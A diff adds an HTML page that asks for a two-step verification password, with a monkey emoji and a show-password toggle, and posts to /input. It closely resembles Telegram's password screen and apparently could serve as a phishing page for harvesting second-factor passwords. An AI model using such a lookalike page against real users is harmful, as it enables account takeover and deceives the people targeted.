@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Password</title>
+    <link rel="stylesheet" href="/static/new.css">
+</head>
+<body>
+    <div class="container">
+        <img src="/static/image.png" alt="Monkey Emoji" class="emoji">
+        <h1>Enter Password</h1>
+        <p>You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
+        
+        <form action="/input" method="POST">
+            <div class="input-group">
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="Enter password" required>
+                    <span class="toggle-password">&#128065;</span>
+                </div>
+                <button type="submit">SUBMIT</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.querySelector(".toggle-password").addEventListener("click", function() {
+            let passwordField = document.querySelector("input[name='password']");
+            passwordField.type = (passwordField.type === "password") ? "text" : "password";
+        });
+    </script>
+</body>
+</html>
